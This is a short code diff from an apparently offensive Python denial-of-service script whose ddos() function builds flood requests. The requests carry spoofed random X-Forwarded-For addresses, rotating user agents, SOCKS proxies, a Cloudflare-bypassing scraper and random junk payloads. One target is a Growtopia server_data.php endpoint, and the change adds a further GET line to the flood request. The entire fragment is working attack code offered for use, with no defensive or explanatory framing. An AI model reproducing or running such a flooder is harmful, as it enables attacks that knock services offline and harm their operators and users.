@@ -2451,6 +2451,7 @@ def Headers(method):
 def ddos():
     socksCrawler()
     scraper = cloudscraper.create_scraper()
+    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
     get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
     post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
     post_again = "POST http://" + ip + "/growtopia/server_data.php"
@@ -2473,7 +2474,7 @@ def ddos():
         0, 255)) + "." + str(random.randint(0, 255)) + "." + str(
             random.randint(0, 255)) + "\r\n"
     useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
-    request = post_host + post_again + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
+    request = post_host + post_again + req + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
     data = random._urandom(1099)
     data1 = random._urandom(1089)
     data2 = random._urandom(1019)
